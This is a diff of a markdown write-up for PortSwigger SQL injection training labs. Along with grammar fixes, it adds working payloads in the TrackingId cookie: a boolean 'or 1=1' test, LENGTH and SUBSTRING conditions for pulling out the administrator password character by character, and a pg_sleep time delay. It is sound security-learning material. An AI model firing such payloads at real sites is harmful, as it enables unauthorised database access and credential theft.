@@ -116,19 +116,26 @@ Description of this lab: The results of the SQL query are not returned, and no e
 
 The database contains a different table called **users**, with columns called **username and password**, find out the password of the administrator user.
 
-So we need modify cookie, when we use burpsuite, and open page, we will get cookie like this: `Cookie: TrackingId=78FpD4ERhK86IMIp; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`. 
+So we need to modify cookie, when we use burp suite, and open page, we will get cookie like this: `Cookie: TrackingId=78FpD4ERhK86IMIp; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`. 
 
 If we modify session, the website will be loss data of this session, so we will modify TrackingID `Cookie: TrackingId=78FpD4ERhK86IMIp+'+or+1=1--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`, and return page including 'Welcome back', so it is right direction. Only thing we can do is making condition. At the first, determine the length of password `Cookie: TrackingId=78FpD4ERhK86IMIp+'or+(SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')=20--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`
 
-Note: using burp intruder for bruting force value in condition 
+Note: using burp intruder for brute force value in condition 
 
-Nextly, using brute force to guess 20-length password
+Next, using brute force to guess 20-length password character by character with turbo intruder  
+
+Guess first character
+`Cookie: TrackingId=78FpD4ERhK86IMIp+'or+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='%s'--; session=cjruWYG4ZqnnopctvKK3e3DJS2nN8eM2`
+
+Using this [script](/Scripts/brutecondition.py) to guess, then write answer for per attack. After 20 trial, we will get password is `s4ykqo9mvgpqisgnzv9t`. Log in with this password and solved the lab.
 
 [Lab 12](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
 
+
+
 [Lab 13](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
 
-Description of this lab: exploit the SQL injection vulnerability to cause a 10 second delay.
+Description of this lab: exploit the SQL injection vulnerability to cause a 10 seconds delay.
 
 Using payload similar `Cookie: TrackingId=nTjOlcnGoesLH7fd+'or+pg_sleep(10)--; session=8BYemkFDFxWMOkX21X7uPWmJ0P1fAYRl` to sleep in 10 second, then solved the lab.
 
